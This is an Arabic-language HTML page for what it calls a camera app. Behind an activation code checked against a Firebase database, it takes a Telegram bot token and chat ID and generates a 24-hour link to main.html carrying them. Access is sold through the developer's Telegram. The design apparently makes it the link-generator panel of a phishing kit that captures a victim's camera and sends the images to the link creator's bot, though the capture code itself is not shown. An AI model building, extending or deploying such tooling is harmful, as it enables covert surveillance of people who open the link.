<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>إعداد التطبيق</title>
  <style>
    body.login-body {
      font-family: 'Cairo', sans-serif;
      text-align: center;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 0;
    }
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      color: white;
      text-align: center;
      background: linear-gradient(135deg, #8B4513, #A52A2A);
    }
    .container {
      max-width: 400px;
      margin: 50px auto;
      background: rgba(0, 0, 0, 0.5);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
    }
    h1 {
      margin-top: 20px;
      font-size: 2.5em;
      color: #FFD700;
    }
    h2 {
      font-size: 24px;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-bottom: 10px;
      font-size: 1.2em;
      text-align: left;
    }
    input[type="password"],
    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 20px;
      border: none;
      border-radius: 5px;
      font-size: 1em;
      background: #5C4033;
      color: white;
    }
    input {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 5px;
      margin-bottom: 15px;
      font-size: 18px;
      text-align: center;
      background: rgba(255, 255, 255, 0.2);
      color: white;
    }
    input::placeholder {
      color: rgba(255, 255, 255, 0.7);
    }
    button {
      padding: 10px 20px;
      font-size: 1.2em;
      color: white;
      background: #A52A2A;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #D2691E;
    }
    button.login-btn {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 18px;
      background: #4CAF50;
      margin-top: 10px;
    }
    button.login-btn:hover {
      background: #45a049;
    }
    .hidden {
      display: none;
    }
    .error {
      color: #ffcccc;
      margin-bottom: 20px;
    }
    #error {
      color: #ff4d4d;
      margin-top: 10px;
      font-size: 16px;
      font-weight: bold;
    }
    .footer-login {
      margin-top: 20px;
      font-size: 14px;
      color: #ddd;
    }
    .footer-login a {
      color: #ffcc00;
      text-decoration: none;
      font-weight: bold;
    }
    .result {
      margin-top: 20px;
      padding: 10px;
      background: rgba(0, 0, 0, 0.6);
      border-radius: 5px;
      word-wrap: break-word;
    }
    .telegram {
      margin-top: 20px;
    }
    .telegram img {
      width: 24px;
      height: 24px;
      vertical-align: middle;
    }
    .expiry {
      margin-top: 10px;
      font-size: 1em;
      color: #FFD700;
    }
    footer {
      margin-top: 30px;
      font-size: 0.9em;
      color: #eee;
    }
  </style>
</head>
<body class="login-body">
  <div id="login-container" class="container">
    <h2>تسجيل الدخول</h2>
    <input type="text" id="userCode" placeholder="أدخل كود التفعيل" />
    <button class="login-btn" onclick="verifyCode()">تحقق</button>
    <div id="error"></div>
    <div class="footer-login">
      للحصول على كود تفعيل تواصل مع المطور
      <a href="https://t.me/caser7" target="_blank">telegram:@caser7</a>
    </div>
  </div>
  <div id="form-container" class="container hidden">
    <h1>إعداد التطبيق</h1>
    <form id="info-form" onsubmit="generateLink(event)">
      <label for="token">أدخل التوكن:</label>
      <input type="password" id="token" placeholder="توكن البوت" required />
      <label for="chat-id">أدخل معرف الشات:</label>
      <input type="password" id="chat-id" placeholder="معرف الشات" required />
      <button type="submit">إنشاء الرابط</button>
    </form>
    <div id="result" class="result hidden"></div>
    <div id="expiry-time" class="expiry hidden"></div>
  </div>
  <footer>
    <div class="telegram">
      <a href="https://t.me/+4WnxlFYJlE80ZTEy" target="_blank">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"
          alt="Telegram"
        />
        انضم إلى قناتي
      </a>
    </div>
    © 2024 - إعداد تطبيق الكاميرا
  </footer>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
    import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyAzeOYd4_rppBX_qvYOvgXj6le6FEyO1ac",
      authDomain: "database-87036.firebaseapp.com",
      projectId: "database-87036",
      storageBucket: "database-87036.firebasestorage.app",
      messagingSenderId: "147777098452",
      appId: "1:147777098452:web:c1c4c305d5e6e0cf0c2141",
      measurementId: "G-8S0XCNF1Y7"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    async function verifyCode() {
      const userCode = document.getElementById("userCode").value.trim().toUpperCase();
      const querySnapshot = await getDocs(collection(db, "codes"));
      let isValid = false;
      querySnapshot.forEach((doc) => {
        const data = doc.data();
        if (data.code === userCode && data.isActive) {
          isValid = true;
        }
      });
      if (isValid) {
        alert("✅ الكود صحيح! سيتم توجيهك الآن.");
        document.getElementById("login-container").classList.add("hidden");
        document.getElementById("form-container").classList.remove("hidden");
        document.body.classList.remove("login-body");
      } else {
        document.getElementById("error").innerText = "❌ الكود غير صحيح أو تم تعطيله.";
      }
    }
    window.verifyCode = verifyCode;
  </script>
  <script>
    const LINK_EXPIRY_HOURS = 24;

    function generateLink(event) {
      event.preventDefault();
      const token = document.getElementById("token").value;
      const chatId = document.getElementById("chat-id").value;
      const existingLink = localStorage.getItem("generatedLink");
      if (existingLink) {
        alert("لا يمكنك إنشاء رابط جديد حتى انتهاء صلاحية الرابط الحالي.");
        return;
      }
      const baseUrl = "main.html";
      const link = `${baseUrl}?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}`;
      localStorage.setItem("generatedLink", link);
      localStorage.setItem("generatedTime", new Date().getTime());
      showLink(link);
      showExpiryTime(new Date().getTime());
    }

    function showLink(link) {
      const result = document.getElementById("result");
      result.innerHTML = `<strong>رابطك الخاص:</strong> <a href="${link}" target="_blank">${link}</a>`;
      result.classList.remove("hidden");
    }

    function showExpiryTime(createdTime) {
      const expiryTimeElement = document.getElementById("expiry-time");
      const expiryTime = new Date(
        parseInt(createdTime) + LINK_EXPIRY_HOURS * 60 * 60 * 1000
      );
      const expiryDateString = expiryTime.toLocaleString();
      expiryTimeElement.textContent = `ينتهي الرابط في: ${expiryDateString}`;
      expiryTimeElement.classList.remove("hidden");
    }
  </script>
</body>
</html>
